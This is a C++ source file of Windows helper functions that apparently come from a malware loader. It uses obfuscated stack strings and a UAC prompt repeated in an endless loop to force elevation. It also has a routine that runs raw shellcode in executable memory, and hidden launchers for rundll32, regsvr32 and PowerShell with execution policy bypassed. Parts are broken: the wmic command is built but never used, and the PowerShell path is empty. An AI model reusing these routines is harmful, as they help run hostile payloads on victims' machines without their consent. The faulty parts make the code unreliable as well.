#include "utils.h"
#include "memory.h"
#include "dbg.h"

namespace Utils {
	DWORD GetIntegrityLevel() {
		DWORD integrity_level = 0;
		HANDLE token_handle = 0;
		PTOKEN_MANDATORY_LABEL mandatory_label = nullptr;

		do
		{
			if (!OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &token_handle)) {
				DBGPRINT(L"File %s, line %d, OpenProcessToken error %d", __FILEW__, __LINE__, GetLastError());
				break;
			}

			DWORD length_needed = 0;

			if (GetTokenInformation(token_handle, TokenIntegrityLevel, nullptr, 0, &length_needed)) {
				DBGPRINT(L"File %s, line %d, GetTokenInformation error %d", __FILEW__, __LINE__, GetLastError());
				break;
			}

			if (GetLastError() != ERROR_INSUFFICIENT_BUFFER) {
				DBGPRINT(L"File %s, line %d, GetTokenInformation error %d", __FILEW__, __LINE__, GetLastError());
				break;
			}

			mandatory_label = (PTOKEN_MANDATORY_LABEL)Memory::Alloc(length_needed);

			if (!mandatory_label) {
				DBGPRINT(L"File %s, line %d, Memory::Alloc error %d", __FILEW__, __LINE__, GetLastError());
				break;
			}

			if (!GetTokenInformation(token_handle, TokenIntegrityLevel, mandatory_label, length_needed, &length_needed)) {
				DBGPRINT(L"File %s, line %d, GetTokenInformation error %d", __FILEW__, __LINE__, GetLastError());
				break;
			}

			integrity_level = *GetSidSubAuthority(mandatory_label->Label.Sid, *GetSidSubAuthorityCount(mandatory_label->Label.Sid) - 1);
		} while (false);

		if (token_handle) {
			CloseHandle(token_handle);
		}

		if (mandatory_label) {
			Memory::Free(mandatory_label);
		}

		return integrity_level;
	}

	bool ElevateUAC(LPCWSTR file_path) {
		bool ret = false;
		WCHAR wmic_path[1025] = { 0 };

		do
		{
			WCHAR wmic_env_str[] = { '%', 'w', 'i', 'n', 'd', 'i', 'r', '%', '\\', 's', 'y', 's', 't', 'e', 'm', '3', '2', '\\', 'w', 'm', 'i', 'c', '.', 'e', 'x', 'e', 0, 0 };

			if (!ExpandEnvironmentStringsW(wmic_env_str, wmic_path, 1025)) {
				DBGPRINT(L"File %s, line %d, ExpandEnvironmentStringsW error %d", __FILEW__, __LINE__, GetLastError());
				break;
			}

			WCHAR runas_str[] = { 'r', 'u', 'n', 'a', 's', 0, 0};
			WCHAR format_str[] = { 'p', 'r', 'o', 'c', 'e', 's', 's', ' ', 'c', 'a', 'l', 'l', ' ', 'c', 'r' ,'e','a','t','e', '"', '%', 's', '"', 0, 0 };
			WCHAR wmic_args[1025] = { 0 };

			wsprintfW(wmic_args, format_str, file_path);

			while (true) {
				if (ShellExecuteW(0, runas_str, file_path, nullptr, nullptr, SW_HIDE) >= (HINSTANCE)32) {
					ret = true;
					break;
				}
			}
		} while (FALSE);

		return ret;
	}

	bool IsElevated() {
		bool ret = false;
		HANDLE token_handle = 0;

		do
		{
			if (!OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &token_handle)) {
				DBGPRINT(L"File %s, line %d, OpenProcessToken error %d", __FILEW__, __LINE__, GetLastError());
				break;
			}

			TOKEN_ELEVATION elevation = { 0 };
			DWORD length_needed = 0;

			if (!GetTokenInformation(token_handle, TokenElevation, &elevation, sizeof(TOKEN_ELEVATION), &length_needed)) {
				DBGPRINT(L"File %s, line %d, GetTokenInformation error %d", __FILEW__, __LINE__, GetLastError());
				break;
			}

			ret = elevation.TokenIsElevated;
		} while (false);

		if (token_handle) {
			CloseHandle(token_handle);
		}

		return ret;
	}

	void RunShellcode(PBYTE shellcode, DWORD shellcode_size) {
		PVOID shellcode_mem = nullptr;
		HANDLE thread_handle = 0;

		do
		{
			shellcode_mem = VirtualAlloc(nullptr, shellcode_size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);

			if (!shellcode_mem) {
				DBGPRINT(L"File %s, line %d, VirtualAlloc error %d", __FILEW__, __LINE__, GetLastError());
				break;
			}

			memcpy(shellcode_mem, shellcode, shellcode_size);

			DWORD old_protect = 0;

			if (!VirtualProtect(shellcode_mem, shellcode_size, PAGE_EXECUTE_READ, &old_protect)) {
				DBGPRINT(L"File %s, line %d, VirtualProtect error %d", __FILEW__, __LINE__, GetLastError());
				break;
			}

			thread_handle = CreateThread(nullptr, 0, (LPTHREAD_START_ROUTINE)shellcode_mem, nullptr, 0, nullptr);

			if (!thread_handle) {
				DBGPRINT(L"File %s, line %d, CreateThread error %d", __FILEW__, __LINE__, GetLastError());
				break;
			}

			WaitForSingleObject(thread_handle, INFINITE);
		} while (false);

		if (shellcode_mem) {
			memset(shellcode_mem, 0, shellcode_size);
			Memory::Free(shellcode_mem);
		}

		if (thread_handle) {
			CloseHandle(thread_handle);
		}
	}

	void RunRundll32(LPCWSTR dll_path, LPCWSTR export_function) {
		WCHAR rundll32[1025] = { 0 };

		if (!ExpandEnvironmentStringsW(L"%WINDIR%\\System32\\rundll32.exe", rundll32, 1024)) {
			DBGPRINT(L"File %s, line %d, ExpandEnvironmentStringsW error %d", __FILEW__, __LINE__, GetLastError());
			return;
		}

		WCHAR args[1025] = { 0 };
		WCHAR open[] = { 'o', 'p', 'e','n', 0, 0 };

		wsprintfW(args, L"%s, %s", dll_path, export_function);
		ShellExecuteW(0, open, rundll32, args, nullptr, SW_HIDE);
	}

	void RunRegsvr32(LPCWSTR dll_path) {
		WCHAR regsvr32[1025] = { 0 };

		if (!ExpandEnvironmentStringsW(L"%WINDIR%\\System32\\regsvr32.exe", regsvr32, 1024)) {
			DBGPRINT(L"File %s, line %d, ExpandEnvironmentStringsW error %d", __FILEW__, __LINE__, GetLastError());
			return;
		}

		WCHAR args[1025] = { 0 };
		WCHAR open[] = { 'o', 'p', 'e','n', 0, 0 };

		wsprintfW(args, L"/s %s", dll_path);
		ShellExecuteW(0, open, regsvr32, args, nullptr, SW_HIDE);
	}

	void RunPS(LPCWSTR ps_path) {
		WCHAR powershell[1025] = { 0 };

		if (!ExpandEnvironmentStringsW(L"", powershell, 1024)) {
			return;
		}

		WCHAR args[1025] = { 0 };
		WCHAR open[] = { 'o', 'p', 'e','n', 0, 0 };

		wsprintfW(args, L"-ExecutionPolicy Bypass -f \"%s\"", ps_path);
		ShellExecuteW(0, open, powershell, args, nullptr, SW_HIDE);
	}
}